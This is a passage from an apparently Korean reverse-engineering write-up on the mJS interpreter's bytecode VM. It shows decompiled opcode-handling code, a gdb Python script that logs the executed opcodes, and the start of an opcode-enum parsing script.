</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_gen_stack_trace</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        mjsa<span style="color:#f92672">-&gt;</span>stack.len <span style="color:#f92672">=</span> stack_len;
</span></span><span style="display:flex;"><span>        mjsa<span style="color:#f92672">-&gt;</span>call_stack.len <span style="color:#f92672">=</span> call_stack_len;
</span></span><span style="display:flex;"><span>        mjsa<span style="color:#f92672">-&gt;</span>arg_stack.len <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>        mjsa<span style="color:#f92672">-&gt;</span>scopes.len <span style="color:#f92672">=</span> scopes_len;
</span></span><span style="display:flex;"><span>        mjsa<span style="color:#f92672">-&gt;</span>loop_addresses.len <span style="color:#f92672">=</span> loop_addresses_len;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjsa, <span style="color:#ae81ff">0xFFF3000000000000LL</span>);
</span></span><span style="display:flex;"><span>clean:
</span></span><span style="display:flex;"><span>        error <span style="color:#f92672">=</span> mjsa<span style="color:#f92672">-&gt;</span>error;
</span></span><span style="display:flex;"><span>        v35 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_bcode_part_get_by_offset</span>(mjsa, start_off);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)v35 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">=</span> error <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF</span> <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)v35 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF0</span>;
</span></span><span style="display:flex;"><span>        v36 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>resa <span style="color:#f92672">=</span> v36;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> mjsa<span style="color:#f92672">-&gt;</span>error;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1Fu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        off_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>l1);
</span></span><span style="display:flex;"><span>        v43 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        p_loop_addresses <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses;
</span></span><span style="display:flex;"><span>        v25 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_mm_sub_pd</span>(
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)<span style="color:#a6e22e">_mm_unpacklo_epi32</span>((<span style="color:#66d9ef">__m128i</span>)<span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes), (<span style="color:#66d9ef">__m128i</span>)xmmword_24020),
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)xmmword_24030);
</span></span><span style="display:flex;"><span>        v26 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(v43, <span style="color:#a6e22e">_mm_unpackhi_pd</span>(v25, v25).m128d_f64[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> v25.m128d_f64[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push_mjs_val</span>(p_loop_addresses, v26);
</span></span><span style="display:flex;"><span>        v45 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses;
</span></span><span style="display:flex;"><span>        v27 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_mm_sub_pd</span>(
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)<span style="color:#a6e22e">_mm_unpacklo_epi32</span>((<span style="color:#66d9ef">__m128i</span>)(off_0 <span style="color:#f92672">+</span> l1 <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>), (<span style="color:#66d9ef">__m128i</span>)xmmword_24020),
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)xmmword_24030);
</span></span><span style="display:flex;"><span>        v28 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjsa, <span style="color:#a6e22e">_mm_unpackhi_pd</span>(v27, v27).m128d_f64[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> v27.m128d_f64[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push_mjs_val</span>(v45, v28);
</span></span><span style="display:flex;"><span>        off_0a <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[l1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> i], <span style="color:#f92672">&amp;</span>l2);
</span></span><span style="display:flex;"><span>        v46 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses;
</span></span><span style="display:flex;"><span>        v29 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_mm_sub_pd</span>(
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)<span style="color:#a6e22e">_mm_unpacklo_epi32</span>((<span style="color:#66d9ef">__m128i</span>)(off_0a <span style="color:#f92672">+</span> l2 <span style="color:#f92672">+</span> l1 <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>), (<span style="color:#66d9ef">__m128i</span>)xmmword_24020),
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)xmmword_24030);
</span></span><span style="display:flex;"><span>        v30 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjsa, <span style="color:#a6e22e">_mm_unpackhi_pd</span>(v29, v29).m128d_f64[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> v29.m128d_f64[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push_mjs_val</span>(v46, v30);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> l2 <span style="color:#f92672">+</span> l1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x20u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_SYNTAX_ERROR, <span style="color:#e6db74">&#34;misplaced &#39;break&#39;&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_pop_val</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses);
</span></span><span style="display:flex;"><span>          v39 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>          v33 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop_val</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses);
</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(v39, v33) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          v40 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>          v34 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop_val</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses);
</span></span><span style="display:flex;"><span>          scopes_len_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(v40, v34);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes) <span style="color:#f92672">&lt;</span> scopes_len_1 )
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">__assert_fail</span>(
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;mjs_stack_size(&amp;mjs-&gt;scopes) &gt;= scopes_len&#34;</span>,
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;src/mjs_exec.c&#34;</span>,
</span></span><span style="display:flex;"><span>              <span style="color:#ae81ff">0x3B5u</span>,
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)&#34;</span>);
</span></span><span style="display:flex;"><span>          mjsa<span style="color:#f92672">-&gt;</span>scopes.len <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> scopes_len_1;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_exec.c&#34;</span>, <span style="color:#ae81ff">952</span>) )
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;BREAKING TO %d&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x21u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_SYNTAX_ERROR, <span style="color:#e6db74">&#34;misplaced &#39;continue&#39;&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v42 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>          v31 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses, <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>          scopes_len_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(v42, <span style="color:#f92672">*</span>v31);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes) <span style="color:#f92672">&lt;</span> scopes_len_0 )
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">__assert_fail</span>(
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;mjs_stack_size(&amp;mjs-&gt;scopes) &gt;= scopes_len&#34;</span>,
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;src/mjs_exec.c&#34;</span>,
</span></span><span style="display:flex;"><span>              <span style="color:#ae81ff">0x3A1u</span>,
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)&#34;</span>);
</span></span><span style="display:flex;"><span>          mjsa<span style="color:#f92672">-&gt;</span>scopes.len <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> scopes_len_0;
</span></span><span style="display:flex;"><span>          v41 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>          v32 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>loop_addresses);
</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(v41, v32) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x22u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>call_stack) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v48 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>          v23 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>call_stack, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>          retval_pos <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(v48, <span style="color:#f92672">*</span>v23);
</span></span><span style="display:flex;"><span>          v49 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span><span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack, (<span style="color:#66d9ef">int</span>)retval_pos <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> v49;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_INTERNAL_ERROR, <span style="color:#e6db74">&#34;cannot return&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x23u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> bp_0.data.len;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x24u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        bcode_offset <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>];
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> bcode_offset;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x25u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( prev_opcode <span style="color:#f92672">!=</span> <span style="color:#ae81ff">22</span> )
</span></span><span style="display:flex;"><span>          mjsa<span style="color:#f92672">-&gt;</span>vals.last_getprop_obj <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push_mjs_val</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>arg_stack, mjsa<span style="color:#f92672">-&gt;</span>vals.last_getprop_obj);
</span></span><span style="display:flex;"><span>        v50 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        p_arg_stack <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>arg_stack;
</span></span><span style="display:flex;"><span>        v20 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_mm_sub_pd</span>(
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)<span style="color:#a6e22e">_mm_unpacklo_epi32</span>((<span style="color:#66d9ef">__m128i</span>)<span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack), (<span style="color:#66d9ef">__m128i</span>)xmmword_24020),
</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">__m128d</span>)xmmword_24030);
</span></span><span style="display:flex;"><span>        v21 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(v50, <span style="color:#a6e22e">_mm_unpackhi_pd</span>(v20, v20).m128d_f64[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> v20.m128d_f64[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push_mjs_val</span>(p_arg_stack, v21);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x26u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        iterator <span style="color:#f92672">=</span> <span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        obj_1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack, <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_object</span>(obj_1) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          name <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack, <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>          key_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_next</span>(mjsa, obj_1, iterator);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( key_2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span> )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            scope <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_find_scope</span>(mjsa, name);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mjs_set_v</span>(mjsa, scope, name, key_2);
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;can&#39;t iterate over non-object value&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_dump</span>(mjsa, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_errorf</span>(
</span></span><span style="display:flex;"><span>          mjsa,
</span></span><span style="display:flex;"><span>          MJS_INTERNAL_ERROR,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Unknown opcode: %d, off %d+%d&#34;</span>,
</span></span><span style="display:flex;"><span>          opcode,
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">LODWORD</span>(bp_0.start_idx),
</span></span><span style="display:flex;"><span>          (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)i);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> bp_0.data.len;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이 함수에서 VM이 돌아간다.</p>
<p>직접 OPCODE를 분석해보기 위해서 gdbscript를 작성했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb 
</span></span><span style="display:flex;"><span>gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;start&#34;</span>)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;vmmap&#34;</span>,to_string<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span>res[<span style="color:#ae81ff">230</span>:]
</span></span><span style="display:flex;"><span>binbase <span style="color:#f92672">=</span> int(res[res<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;0x&#39;</span>) : res<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;0x&#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bp_off <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x007219</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> bp_off:
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;b * &#34;</span><span style="color:#f92672">+</span>hex(binbase <span style="color:#f92672">+</span> i))
</span></span><span style="display:flex;"><span>gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;c&#34;</span>)
</span></span><span style="display:flex;"><span>opcode <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(l):
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#34;$rax&#34;</span>))
</span></span><span style="display:flex;"><span>    opcode<span style="color:#f92672">.</span>append(rax)
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;c&#34;</span>)
</span></span><span style="display:flex;"><span>    print(i)
</span></span><span style="display:flex;"><span>print(opcode)
</span></span></code></pre></div><p>OPCODE를 배열을 뽑아볼 수 있었다.
[36, 11, 9, 22, 37, 11, 29, 35]
분석을 편하게 하기 위해서 파이썬 스크립트를 작성했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>str_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;enum mjs_opcode {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_NOP,               /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_DROP,              /* ( a -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_DUP,               /* ( a -- a a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_SWAP,              /* ( a b -- b a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_JMP,               /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_JMP_TRUE,          /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_JMP_NEUTRAL_TRUE,  /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_JMP_FALSE,         /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_JMP_NEUTRAL_FALSE, /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_FIND_SCOPE,        /* ( a -- a b ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_SCOPE,        /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_STR,          /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_TRUE,         /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_FALSE,        /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_INT,          /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_DBL,          /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_NULL,         /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_UNDEF,        /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_OBJ,          /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_ARRAY,        /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_FUNC,         /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_PUSH_THIS,         /* ( -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_GET,               /* ( key obj  -- obj[key] ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_CREATE,            /* ( key obj -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_EXPR,              /* ( ... -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_APPEND,            /* ( a b -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_SET_ARG,           /* ( a -- a ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_NEW_SCOPE,         /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_DEL_SCOPE,         /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_CALL,              /* ( func param1 param2 ... num_params -- result ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_RETURN,            /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_LOOP,         /* ( -- ) Push break &amp; continue addresses to loop_labels */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_BREAK,        /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_CONTINUE,     /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_SETRETVAL,    /* ( a -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_EXIT,         /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_BCODE_HEADER, /* ( -- ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_ARGS,         /* ( -- ) Mark the beginning of function call arguments */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_FOR_IN_NEXT,  /* ( name obj iter_ptr -- name obj iter_ptr_next ) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OP_MAX&#39;&#39;&#39;</span><span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
